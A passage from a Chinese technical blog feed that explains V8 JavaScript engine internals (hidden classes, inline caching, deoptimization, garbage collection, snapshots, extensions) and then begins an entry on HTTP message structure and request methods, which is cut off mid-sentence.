title="1.3.JavaScript引擎"></a>1.3.JavaScript引擎</h2><p><img src="https://pic1.zhimg.com/80/v2-0f5471e21a25e237dcfae2d34a306788_720w.png" alt="img"></p><p>JavaScript本质上是一种解释型语言，与编译型语言不同的是它需要一遍执行一边解析，而编译型语言在执行时已经完成编译，可直接执行，有更快的执行速度(如上图所示)。JavaScript代码是在浏览器端解析和执行的，如果需要时间太长，会影响用户体验。那么提高JavaScript的解析速度就是当务之急。JavaScript引擎和渲染引擎的关系如下图所示：</p><p><img src="https://pic4.zhimg.com/80/v2-43b71b75cd4f28db05ab967e3aad5a97_720w.png" alt="img"></p><p>JavaScript语言是解释型语言，为了提高性能，引入了Java虚拟机和C++编译器中的众多技术。现在JavaScript引擎的执行过程大致是：</p><p>源代码-→抽象语法树-→字节码-→JIT-→本地代码(V8引擎没有中间字节码)。一段代码的抽象语法树示例如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function demo(name) &#123;</span><br><span class="line">    console.log(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抽象语法树如下：</p><p><img src="https://pic4.zhimg.com/80/v2-4ee7dc5c0787930c03ff203c41a1482b_720w.png" alt="img"></p><p>V8更加直接的将抽象语法树通过JIT技术转换成本地代码，放弃了在字节码阶段可以进行的一些性能优化，但保证了执行速度。在V8生成本地代码后，也会通过Profiler采集一些信息，来优化本地代码。虽然，少了生成字节码这一阶段的性能优化，但极大减少了转换时间。</p><p>但是在2017年4月底，v8 的 5.9 版本发布了，新增了一个 Ignition 字节码解释器，将默认启动，从此之后将与JSCore有大致相同的流程。做出这一改变的原因为：（主要动机）减轻机器码占用的内存空间，即牺牲时间换空间；提高代码的启动速度；对 v8 的代码进行重构，降低 v8 的代码复杂度(<a href="https://link.zhihu.com/?target=https://cnodejs.org/topic/59084a9cbbaf2f3f569be482">V8 Ignition：JS 引擎与字节码的不解之缘 - CNode技术社区</a>)。</p><p>JavaScript的性能和C相比还有不小的距离，可预见的未来估计也只能接近它，而不是与它相比，这从语言类型上已经决定。下面将对V8引擎进行更为细致的介绍。</p><h2 id="2-V8引擎"><a href="#2-V8引擎" class="headerlink" title="2.V8引擎"></a>2.V8引擎</h2><p>V8引擎是一个JavaScript引擎实现，最初由一些语言方面专家设计，后被谷歌收购，随后谷歌对其进行了开源。V8使用C++开发，，在运行JavaScript之前，相比其它的JavaScript的引擎转换成字节码或解释执行，V8将其编译成原生机器码（IA-32, x86-64, ARM, or MIPS CPUs），并且使用了如内联缓存（inline caching）等方法来提高性能。有了这些功能，JavaScript程序在V8引擎下的运行速度媲美二进制程序。V8支持众多操作系统，如windows、linux、android等，也支持其他硬件架构，如IA32,X64,ARM等，具有很好的可移植和跨平台特性。<br>V8项目代码结构如下：</p><p><img src="https://pic4.zhimg.com/80/v2-cb5e37b2c362ad0335d6331ef3be6daf_720w.png" alt="img"></p><h2 id="2-1-数据表示"><a href="#2-1-数据表示" class="headerlink" title="2.1.数据表示"></a>2.1.数据表示</h2><p>JavaScript是一种动态类型语言，在编译时并不能准确知道变量的类型，只可以在运行时确定，这就不像c++或者java等静态类型语言，在编译时候就可以确切知道变量的类型。然而，在运行时计算和决定类型，会严重影响语言性能，这也就是JavaScript运行效率比C++或者JAVA低很多的原因之一。</p><p>在C++中，源代码需要经过编译才能执行，在生成本地代码的过程中，变量的地址和类型已经确定，运行本地代码时利用数组和位移就可以存取变量和方法的地址，不需要再进行额外的查找，几个机器指令即可完成，节省了确定类型和地址的时间。由于JavaScript是无类型语言，那就不能像c++那样在执行时已经知道变量的类型和地址，需要临时确定。JavaScript 和C++有以下几个区别：</p><ul><li>编译确定位置，C++编译阶段确定位置偏移信息，在执行时直接存取，JavaScript在执行阶段确定，而且执行期间可以修改对象属性；</li><li>偏移信息共享，C++有类型定义，执行时不能动态改变，可共享偏移信息，JavaScript每个对象都是自描述，属性和位置偏移信息都包含在自身的结构中；</li><li>偏移信息查找，C++查找偏移地址很简单，在编译代码阶段，对使用的某类型成员变量直接设置偏移位置，JavaScript中使用一个对象，需要通过属性名匹配才能找到相应的值，需要更多的操作。</li></ul><p>在代码执行过程中，变量的存取是非常普遍和频繁的，通过偏移量来存取，使用少数两个汇编指令就能完成，如果通过属性名匹配则需要更多的汇编指令，也需要更多的内存空间。示例如下：</p><p><img src="https://pic3.zhimg.com/80/v2-794bcbcc25818b827d77ff712271ce56_720w.jpg" alt="img"></p><p>在JavaScript中，除boolean，number，string，null，undefined这个五个简单变量外，其他的数据都是对象，V8使用一种特殊的方式来表示它们，进而优化JavaScript的内部表示问题。</p><p>在V8中，数据的内部表示由数据的实际内容和数据的句柄构成。数据的实际内容是变长的，类型也是不同的；句柄固定大小，包含指向数据的指针。这种设计可以方便V8进行垃圾回收和移动数据内容，如果直接使用指针的话就会出问题或者需要更大的开销，使用句柄的话，只需修改句柄中的指针即可，使用者使用的还是句柄，指针改动是对使用者透明的。</p><p>除少数数据(如整型数据)由handle本身存储外，其他内容限于句柄大小和变长等原因，都存储在堆中。整数直接从value中取值，然后使用一个指针指向它，可以减少内存的占用并提高访问速度。一个句柄对象的大小是4字节(32位设备)或者8字节(64位设备)，而在JavaScriptCore中，使用的8个字节表示句柄。在堆中存放的对象都是4字节对齐的，所以它们指针的后两位是不需要的，V8用这两位表示数据的类型，00为整数，01为其他。</p><p>JavaScript对象在V8中的实现包含三个部分：隐藏类指针，这是v8为JavaScript对象创建的隐藏类；属性值表指针，指向该对象包含的属性值；元素表指针，指向该对象包含的属性。</p><h2 id="2-2-工作过程"><a href="#2-2-工作过程" class="headerlink" title="2.2.工作过程"></a>2.2.工作过程</h2><p>前面有过介绍，V8引擎在执行JavaScript的过程中，主要有两个阶段：编译和运行，与C++的执行前完全编译不同的是，JavaScript需要在用户使用时完成编译和执行。在V8中，JavaScript相关代码并非一下完成编译的，而是在某些代码需要执行时，才会进行编译，这就提高了响应时间，减少了时间开销。在V8引擎中，源代码先被解析器转变为抽象语法树(AST)，然后使用JIT编译器的全代码生成器从AST直接生成本地可执行代码。这个过程不同于JAVA先生成字节码或中间表示，减少了AST到字节码的转换时间，提高了代码的执行速度。但由于缺少了转换为字节码这一中间过程，也就减少了优化代码的机会。</p><p>V8引擎编译本地代码时使用的主要类如下所示：</p><ul><li>Script：表示JavaScript代码，即包含源代码，又包含编译之后生成的本地代码，即是编译入口，又是运行入口；</li><li>Compiler：编译器类，辅组Script类来编译生成代码，调用解释器(Parser)来生成AST和全代码生成器，将AST转变为本地代码；</li><li>AstNode：抽象语法树节点类，是其他所有节点的基类，包含非常多的子类，后面会针对不同的子类生成不同的本地代码；</li><li>AstVisitor：抽象语法树的访问者类，主要用来遍历异构的抽象语法树；</li><li>FullCodeGenerator：AstVisitor类的子类，通过遍历AST来为JavaScript生成本地可执行代码。</li></ul><p><img src="https://pic1.zhimg.com/80/v2-274bcd0e43b8b718ce58de8ae51e1b70_720w.png" alt="img"></p><p>JavaScript代码编译的过程大致为：Script类调用Compiler类的Compile函数为其生成本地代码。Compile函数先使用Parser类生成AST，再使用FullCodeGenerator类来生成本地代码。本地代码与具体的硬件平台密切相关，FullCodeGenerator使用多个后端来生成与平台相匹配的本地汇编代码。由于FullCodeGenerator通过遍历AST来为每个节点生成相应的汇编代码，缺失了全局视图，节点之间的优化也就无从谈起。</p><p>在执行编译之前，V8会构建众多全局对象并加载一些内置的库（如math库），来构建一个运行环境。而且在JavaScript源代码中，并非所有的函数都被编译生成本地代码，而是延迟编译，在调用时才会编译。</p><p>由于V8缺少了生成中间代码这一环节，缺少了必要的优化，为了提升性能，V8会在生成本地代码后，使用数据分析器(profiler)采集一些信息，然后根据这些数据将本地代码进行优化，生成更高效的本地代码，这是一个逐步改进的过程。同时，当发现优化后代码的性能还不如未优化的代码，V8将退回原来的代码，也就是优化回滚。下面介绍一下运行阶段，该阶段使用的主要类如下所示：</p><ul><li>Script：表示JavaScript代码，即包含源代码，又包含编译之后生成的本地代码，即是编译入口，又是运行入口；</li><li>Execution：运行代码的辅组类，包含一些重要函数，如Call函数，它辅组进入和执行Script代码；</li><li>JSFunction：需要执行的JavaScript函数表示类；</li><li>Runtime：运行这些本地代码的辅组类，主要提供运行时所需的辅组函数，如：属性访问、类型转换、编译、算术、位操作、比较、正则表达式等；</li><li>Heap：运行本地代码需要使用的内存堆类；</li><li>MarkCompactCollector：垃圾回收机制的主要实现类，用来标记、清除和整理等基本的垃圾回收过程；</li><li>SweeperThread：负责垃圾回收的线程。</li></ul><p><img src="https://pic4.zhimg.com/80/v2-d9eaec9f9912dd0e26c636675fe10fe3_720w.png" alt="img"></p><p>先根据需要编译和生成这些本地代码，也就是使用编译阶段那些类和操作。在V8中，函数是一个基本单位，当某个JavaScript函数被调用时，V8会查找该函数是否已经生成本地代码，如果已经生成，则直接调用该函数。否则，V8引擎会生成属于该函数的本地代码。这就节约了时间，减少了处理那些使用不到的代码的时间。其次，执行编译后的代码为JavaScript构建JS对象，这需要Runtime类来辅组创建对象，并需要从Heap类分配内存。再次，借助Runtime类中的辅组函数来完成一些功能，如属性访问等。最后，将不用的空间进行标记清除和垃圾回收。</p><h2 id="2-3-优化回滚"><a href="#2-3-优化回滚" class="headerlink" title="2.3.优化回滚"></a>2.3.优化回滚</h2><p>因为V8是基于AST直接生成本地代码，没有经过中间表示层的优化，所以本地代码尚未经过很好的优化。于是，在2010年，V8引入了新的编译器-Crankshaft，它主要针对热点函数进行优化，基于JavaScript源代码开始分析而非本地代码，同时构建Hydroger图并基于此来进行优化分析。</p><p>Crankshaft编译器为了性能考虑，通常会做出比较乐观和大胆的预测—代码稳定且变量类型不变，所以可以生成高效的本地代码。但是，鉴于JavaScript的一个弱类型的语言，变量类型也可能在执行的过程中进行改变，鉴于这种情况，V8会将该编译器做的想当然的优化进行回滚，称为优化回滚。</p><p>示例如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var counter = 0;</span><br><span class="line">function test(x, y) &#123;</span><br><span class="line">    counter++;</span><br><span class="line">    if (counter &lt; 1000000) &#123;</span><br><span class="line">        // do something</span><br><span class="line">        return &#x27;jeri&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    var unknown = new Date();</span><br><span class="line">    console.log(unknown);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数被调用多次之后，V8引擎可能会触发Crankshaft编译器对其进行优化，而优化代码认为示例代码的类型信息都已经被确定。但，由于尚未真正执行到new Date()这个地方，并未获取unknown这个变量的类型，V8只得将该部分代码进行回滚。优化回滚是一个很耗时的操作，在写代码过程中，尽量不要触发优化该操作。</p><p>在最近发布的 V8 5.9 版本中，新增了一个 Ignition 字节码解释器，TurboFan 和 Ignition 结合起来共同完成JavaScript的编译。这个版本中消除 Cranshaft 这个旧的编译器，并让新的 Turbofan 直接从字节码来优化代码，并当需要进行反优化的时候直接反优化到字节码，而不需要再考虑 JS 源代码。</p><h2 id="2-4-隐藏类与内嵌缓存"><a href="#2-4-隐藏类与内嵌缓存" class="headerlink" title="2.4.隐藏类与内嵌缓存"></a>2.4.隐藏类与内嵌缓存</h2><h2 id="2-4-1-隐藏类"><a href="#2-4-1-隐藏类" class="headerlink" title="2.4.1.隐藏类"></a>2.4.1.隐藏类</h2><p>在执行C++代码时，仅凭几个指令即可根据偏移信息获取变量信息，而JavaScript里需要通过字符串匹配来查找属性值的，这就需要更多的操作才能访问到变量信息，而代码量变量存取是十分频繁的，这也就制约了JavaScript的性能。V8借用了类和偏移位置的思想，将本来通过属性名匹配来访问属性值的方法进行了改进，使用类似C++编译器的偏移位置机制来实现，这就是隐藏类。</p><p>隐藏类将对象划分成不同的组，对于组内对象拥有相同的属性名和属性值的情况，将这些组的属性名和对应的偏移位置保存在一个隐藏类中，组内所有对象共享该信息。同时，也可以识别属性不同的对象。示例如下：</p><p><img src="https://pic2.zhimg.com/80/v2-bf67f5eb2667ddd86bfde785612aca35_720w.png" alt="img"></p><p>使用Point构造了两个对象p和q，这两个对象具有相同的属性名，V8将它们归为同一个组，也就是隐藏类，这些属性在隐藏类中有相同的偏移值，p和q共享这一信息，进行属性访问时，只需根据隐藏类的偏移值即可。由于JavaScript是动态类型语言，在执行时可以更改变量的类型，如果上述代码执行之后，执行q.z=2，那么p和q将不再被认为是一个组，q将是一个新的隐藏类。</p><h2 id="2-4-2-内嵌缓存"><a href="#2-4-2-内嵌缓存" class="headerlink" title="2.4.2.内嵌缓存"></a>2.4.2.内嵌缓存</h2><p>正常访问对象属性的过程是：首先获取隐藏类的地址，然后根据属性名查找偏移值，然后计算该属性的地址。虽然相比以往在整个执行环境中查找减小了很大的工作量，但依然比较耗时。能不能将之前查询的结果缓存起来，供再次访问呢？当然是可行的，这就是内嵌缓存。</p><p>内嵌缓存的大致思路就是将初次查找的隐藏类和偏移值保存起来，当下次查找的时候，先比较当前对象是否是之前的隐藏类，如果是的话，直接使用之前的缓存结果，减少再次查找表的时间。当然，如果一个对象有多个属性，那么缓存失误的概率就会提高，因为某个属性的类型变化之后，对象的隐藏类也会变化，就与之前的缓存不一致，需要重新使用以前的方式查找哈希表。</p><h2 id="2-5-内存管理"><a href="#2-5-内存管理" class="headerlink" title="2.5.内存管理"></a>2.5.内存管理</h2><p>Node中通过JavaScript使用内存时就会发现只能使用部分内存（64位系统下约为1.4 GB，32位系统下约为0.7 GB），其深层原因是 V8 垃圾回收机制的限制所致（如果可使用内存太大，V8在进行垃圾回收时需耗费更多的资源和时间，严重影响JS的执行效率）。下面对内存管理进行介绍。</p><p>内存的管理组要由分配和回收两个部分构成。V8的内存划分如下：</p><ul><li><p>Zone：管理小块内存。其先自己申请一块内存，然后管理和分配一些小内存，当一块小内存被分配之后，不能被Zone回收，只能一次性回收Zone分配的所有小内存。当一个过程需要很多内存，Zone将需要分配大量的内存，却又不能及时回收，会导致内存不足情况。</p></li><li><p>堆：管理JavaScript使用的数据、生成的代码、哈希表等。为方便实现垃圾回收，堆被分为三个部分：</p><p>年轻分代：为新创建的对象分配内存空间，经常需要进行垃圾回收。为方便年轻分代中的内容回收，可再将年轻分代分为两半，一半用来分配，另一半在回收时负责将之前还需要保留的对象复制过来。<br>年老分代：根据需要将年老的对象、指针、代码等数据保存起来，较少地进行垃圾回收。<br>大对象：为那些需要使用较多内存对象分配内存，当然同样可能包含数据和代码等分配的内存，一个页面只分配一个对象。</p></li></ul><p><img src="https://pic4.zhimg.com/80/v2-76f0fb426e86e9b54fecb6bef2582e8b_720w.png" alt="img"></p><h2 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h2><p>V8 使用了分代和大数据的内存分配，在回收内存时使用精简整理的算法标记未引用的对象，然后消除没有标记的对象，最后整理和压缩那些还未保存的对象，即可完成垃圾回收。</p><p>在V8中，使用较多的是年轻分代和年老分代。年轻分代中的对象垃圾回收主要通过Scavenge算法进行垃圾回收。在Scavenge的具体实现中，主要采用了Cheney算法：通过复制的方式实现的垃圾回收算法。它将堆内存分为两个 semispace，一个处于使用中（From空间），另一个处于闲置状态（To空间）。当分配对象时，先是在From空间中进行分配。当开始进行垃圾回收时，会检查From空间中的存活对象，这些存活对象将被复制到To空间中，而非存活对象占用的空间将会被释放。完成复制后，From空间和To空间的角色发生对换。在垃圾回收的过程中，就是通过将存活对象在两个 semispace 空间之间进行复制。年轻分代中的对象有机会晋升为年老分代，条件主要有两个：一个是对象是否经历过Scavenge回收，一个是To空间的内存占用比超过限制。</p><p>对于年老分代中的对象，由于存活对象占较大比重，再采用上面的方式会有两个问题：一个是存活对象较多，复制存活对象的效率将会很低；另一个问题依然是浪费一半空间的问题。为此，V8在年老分代中主要采用了Mark-Sweep（标记清除）标记清除和Mark-Compact（标记整理）相结合的方式进行垃圾回收。</p><h2 id="2-6-快照"><a href="#2-6-快照" class="headerlink" title="2.6.快照"></a>2.6.快照</h2><p>在V8引擎启动时，需要构建JavaScript运行环境，需要加载很多内置对象，同时也需要建立内置的函数，如Array，String，Math等。为了使V8更加整洁，加载对象和建立函数等任务都是使用JavaScript文件来实现的，V8引擎负责提供机制来支持，就是在编译和执行JavaScript前先加载这些文件。</p><p>V8引擎需要编译和执行这些内置的JavaScript代码，同时使用堆等来保存执行过程中创建的对象、代码等，这些都需要时间。为此，V8引入了快照机制。将这些内置的对象和函数加载之后的内存保存并序列化。序列化之后的结果很容易反序列化，经过快照机制的启动时间可以缩减几毫秒。快照机制也可以将一些开发者认为需要的JavaScript文件序列化，以减少处理时间。不过快照机制的加载的代码不能被CrankShaft这样的编译器优化，可能会存在性能问题。</p><h2 id="3-V8-VS-JavaScriptCore"><a href="#3-V8-VS-JavaScriptCore" class="headerlink" title="3.V8 VS JavaScriptCore"></a>3.V8 VS JavaScriptCore</h2><p>JavaScriptCore引擎是WebKit中默认的JavaScript引擎，也是苹果开源的一个项目，应用较为广泛。最初，性能不是很好，从2008年开始了一系列的优化，重新实现了编译器和字节码解释器，使得引擎的性能有较大的提升。随后内嵌缓存、基于正则表达式的JIT、简单的JIT及字节码解释器等技术引入进来，JavaScriptCore引擎也在不断的迭代和发展。</p><p>V8引擎自诞生之日起就以性能优化作为目标，引入了众多新技术，极大了带动了整个业界JavaScript引擎性能的快速发展。总的来说，V8引擎较为激进，青睐可以提高性能的新技术，而JavaScriptCore引擎较为稳健，渐进式的改变着自己的性能。总的来说JavaScript引擎工作流程（包含v8和JavaScriptCore）如下所示：</p><p><img src="https://pic1.zhimg.com/80/v2-993bbf0a46f6feaef5f7b5005aa1aa34_720w.png" alt="img"></p><p>JavaScriptCore 的大致流程为：源代码-→抽象语法树-→字节码-→JIT-→本地代码。JavaScriptCore与V8有一些不同之处，其中最大的不同就是新增了<strong>字节码</strong>的中间表示，并加入了多层JIT编译器（如：简单JIT编译器、DFG JIT编译器、LLVM等）优化性能，不停的对本地代码进行优化。(<strong>在 V8 的 5.9 版本中，新增了一个 Ignition 字节码解释器，TurboFan 和 Ignition 结合起来共同完成JavaScript的编译，此后 V8 将与 JavaScriptCore 有大致相同的流程，Node 8.0中 V8 版本为 5.8</strong>)</p><p>还有就是在数据表示方面，V8在不同的机器上使用与机器位数相匹配的数据表示，而在JavaScriptCore中句柄都是使用64位表示，其可以表示更大范围的数字，所以即使在32位机器上，浮点类型同样可以保存在句柄中，不再需要访问堆中的数据，当也会占用更多的空间。</p><h2 id="4-功能扩展"><a href="#4-功能扩展" class="headerlink" title="4.功能扩展"></a>4.功能扩展</h2><p>JavaScript引擎的主要功能是解析和执行JavaScript代码，往往不能满足使用者多样化的需要，那么就可以增加扩展以提升它的能力。V8引擎有两种扩展机制：绑定和扩展。</p><h2 id="4-1-绑定机制"><a href="#4-1-绑定机制" class="headerlink" title="4.1.绑定机制"></a>4.1.绑定机制</h2><p>使用IDL文件或接口文件生成绑定文件，将这些文件同V8引擎一起编译。WebKit中使用IDL来定义JavaScript，但又与IDL有所不同，有一些改变。定义一个新的接口的步骤大致如下：</p><ul><li>1.定义新的接口文件，可以在JavaScript代码进行调用，如mymodule.MyObj.myAttr；</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">module mymodule &#123;</span><br><span class="line">    interface [</span><br><span class="line">            InterfaceName = MyObject</span><br><span class="line">    ] MyObj &#123; </span><br><span class="line">        readonly attribute long myAttr;</span><br><span class="line">        DOMString myMethod (DOMString myArg);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>2.按照引擎定义的标准接口为基础实现接口类，生成JavaScript引擎所需的绑定文件。WebKit提供了工具帮助生成所需的绑定类，根据引擎不同和引擎开发语言的不同而有所差异。V8引擎会为上述示例代码生成 v8MyObj.h (MyObj类具体的实现代码)和 V8MyObj.cpp (桥接代码，辅组注册桥接的函数到V8引擎)两个绑定文件。</li></ul><p>JavaScript引擎绑定机制需要将扩展代码和JavaScript引擎一块编译和打包，不能根据需要在引擎启动后再动态注入这些本地代码。在实际WEB开发中，开发者都是基于现有浏览器的，根本不可能介入到JavaScript引擎的编译中，绑定机制有很大的局限性，但其非常高效，适用于对性能要求较高的场景。</p><h2 id="4-2-Extension机制"><a href="#4-2-Extension机制" class="headerlink" title="4.2. Extension机制"></a>4.2. Extension机制</h2><p>通过V8的基类Extension进行能力扩展，无需和V8引擎一起编译，可以动态为引擎增加功能特性，具有很大的灵活性。</p><p>Extension机制的大致思路就是，V8提供一个基类Extension和一个全局注册函数，要想扩展JavaScript能力，需要经过以下步骤：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class MYExtension : public v8::Extension &#123;</span><br><span class="line">    public:</span><br><span class="line">        MYExtension() : v8::Extension(&quot;v8/My&quot;, &quot;native function my();&quot;) &#123;&#125;</span><br><span class="line">        virtual v8::Handle&lt;v8::FunctionTemplate&gt; GetNativeFunction (</span><br><span class="line">        v8::Handle&lt;v8::String&gt; name) &#123;</span><br><span class="line">            // 可以根据name来返回不同的函数</span><br><span class="line">            return v8::FunctionTemplate::New(MYExtention::MY);</span><br><span class="line">        &#125;</span><br><span class="line">        static v8::Handle&lt;v8::Value&gt; MY(const v8::Arguments&amp; args) &#123;</span><br><span class="line">            // Do sth here</span><br><span class="line">            return v8::Undefined();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line">MYExtension extension;</span><br><span class="line">RegisterExtension(&amp;extension);</span><br></pre></td></tr></table></figure><ul><li>1.基于Extension基类构建一个它的子类，并实现它的虚函数—GetNativeFunction，根据参数name来决定返回实函数；</li><li>2.创建一个该子类的对象，并通过注册函数将该对象注册到V8引擎，当JavaScript调用’my’函数时就可被调用到。</li></ul><p>Extension机制是调用V8的接口注入新函数，动态扩展非常方便，但没有绑定机制高效，适用于对性能要求不高的场景。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在过去几年，JavaScript在很多领域得到了广泛的应用，然而限于JavaScript语言本身的不足，执行效率不高。Google也推出了一些JavaScript网络应用，如Gmail、Google Maps及Google Docs office等。这些应用的性能不仅受到服务器、网络、渲染引擎以及其他诸多因素的影响，同时也受到JavaScript本身执行速度的影响。然而既有的JavaScript引擎无法满足新的需求，而性能不佳一直是网络应用开发者最关心的。Google就开始了V8引擎的研究，将一系列新技术引入JavaScript引擎中，大大提高了JavaScript的执行效率。相信随着V8引擎的不断发展，JavaScript也会有更广泛的应用场景，前端工程师也会有更好的未来！<br>那么结合上面对于V8引擎的介绍，我们在编程中应注意：</p><ul><li>类型。对于函数，JavaScript是一种动态类型语言，JavaScriptCore和V8都使用隐藏类和内嵌缓存来提高性能，为了保证缓存命中率，一个函数应该使用较少的数据类型；对于数组，应尽量存放相同类型的数据，这样就可以通过偏移位置来访问。</li><li>数据表示。简单类型数据（如整型）直接保存在句柄中，可以减少寻址时间和内存占用，如果可以使用整数表示的，尽量不要用浮点类型。</li><li>内存。虽然JavaScript语言会自己进行垃圾回收，但我们也应尽量做到及时回收不用的内存，对不再使用的对象设置为null或使用delete方法来删除(使用delete方法删除会触发隐藏类新建，需要更多的额外操作)。</li><li>优化回滚。在执行多次之后，不要出现修改对象类型的语句，尽量不要触发优化回滚，否则会大幅度降低代码的性能。</li><li>新机制。使用JavaScript引擎或者渲染引擎提供的新机制和新接口提高性能。</li></ul><p>转载至<a href="https://zhuanlan.zhihu.com/p/27628685">https://zhuanlan.zhihu.com/p/27628685</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="V8引擎" scheme="http://aiolimp.com/categories/V8%E5%BC%95%E6%93%8E/"/>
    
    
    <category term="V8引擎" scheme="http://aiolimp.com/tags/V8%E5%BC%95%E6%93%8E/"/>
    
  </entry>
  
  <entry>
    <title>HTTP&amp;&amp;HTTPS</title>
    <link href="http://aiolimp.com/2021/08/10/HTTP&amp;&amp;HTTPS/"/>
    <id>http://aiolimp.com/2021/08/10/HTTP&amp;&amp;HTTPS/</id>
    <published>2021-08-10T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.205Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="001-HTTP-报文结构是怎样的？"><a href="#001-HTTP-报文结构是怎样的？" class="headerlink" title="001. HTTP 报文结构是怎样的？"></a>001. HTTP 报文结构是怎样的？</h2><p>对于 TCP 而言，在传输的时候分为两个部分:<strong>TCP头</strong>和<strong>数据部分</strong>。</p><p>而 HTTP 类似，也是<code>header + body</code>的结构，具体而言:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">起始行 + 头部 + 空行 + 实体</span><br></pre></td></tr></table></figure><p>由于 http <code>请求报文</code>和<code>响应报文</code>是有一定区别，因此我们分开介绍。</p><h3 id="起始行"><a href="#起始行" class="headerlink" title="起始行"></a>起始行</h3><p>对于请求报文来说，起始行类似下面这样:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure><p>也就是<strong>方法 + 路径 + http版本</strong>。</p><p>对于响应报文来说，起始行一般张这个样:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br></pre></td></tr></table></figure><p>响应报文的起始行也叫做<code>状态行</code>。由<strong>http版本、状态码和原因</strong>三部分组成。</p><p>值得注意的是，在起始行中，每两个部分之间用<strong>空格</strong>隔开，最后一个部分后面应该接一个<strong>换行</strong>，严格遵循<code>ABNF</code>语法规范。</p><h3 id="头部"><a href="#头部" class="headerlink" title="头部"></a>头部</h3><p>展示一下请求头和响应头在报文中的位置:</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd6012e2fc88~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd62af8538e4~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>不管是请求头还是响应头，其中的字段是相当多的，而且牵扯到<code>http</code>非常多的特性，这里就不一一列举的，重点看看这些头部字段的格式：</p><ul><li><ol><li>字段名不区分大小写</li></ol></li><li><ol><li>字段名不允许出现空格，不可以出现下划线<code>_</code></li></ol></li><li><ol><li>字段名后面必须<strong>紧接着<code>:</code></strong></li></ol></li></ul><h3 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h3><p>很重要，用来区分开<code>头部</code>和<code>实体</code>。</p><p>问: 如果说在头部中间故意加一个空行会怎么样？</p><p>那么空行后的内容全部被视为实体。</p><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>就是具体的数据了，也就是<code>body</code>部分。请求报文对应<code>请求体</code>, 响应报文对应<code>响应体</code>。</p><h2 id="002-如何理解-HTTP-的请求方法？"><a href="#002-如何理解-HTTP-的请求方法？" class="headerlink" title="002. 如何理解 HTTP 的请求方法？"></a>002. 如何理解 HTTP 的请求方法？</h2><h3 id="有哪些请求方法？"><a href="#有哪些请求方法？" class="headerlink" title="有哪些请求方法？"></a>有哪些请求方法？</h3><p><code>http/1.1</code>规定了以下请求方法(注意，都是大写):</p><ul><li>GET: 通常用来获取资源</li><li>HEAD: 获取资源的元信息</li><li>POST: 提交数据，即上传数据</li><li>PUT: 修改数据</li><li>DELETE: 删除资源(几乎用不到)</li><li>CONNECT: 建立连接隧道，用于代理服务器</li><li>OPTIONS: 列出可对资源实行的请求方法，用来跨域请求</li><li>TRACE: 追踪请求-响应的传输路径</li></ul><h3 id="GET-和-POST-有什么区别？"><a href="#GET-和-POST-有什么区别？" class="headerlink" title="GET 和 POST 有什么区别？"></a>GET 和 POST 有什么区别？</h3><p>首先最直观的是语义上的区别。</p><p>而后又有这样一些具体的差别:</p><ul><li>从<strong>缓存</strong>的角度，GET 请求会被浏览器主动缓存下来，留下历史记录，而 POST 默认不会。</li><li>从<strong>编码</strong>的角度，GET 只能进行 URL 编码，只能接收 ASCII 字符，而 POST 没有限制。</li><li>从<strong>参数</strong>的角度，GET 一般放在 URL 中，因此不安全，POST 放在请求体中，更适合传输敏感信息。</li><li>从<strong>幂等性</strong>的角度，<code>GET</code>是<strong>幂等</strong>的，而<code>POST</code>不是。(<code>幂等</code>表示执行相同的操作，结果也是相同的)</li><li>从<strong>TCP</strong>的角度，GET 请求会把请求报文一次性发出去，而 POST 会分为两个 TCP 数据包，首先发 header 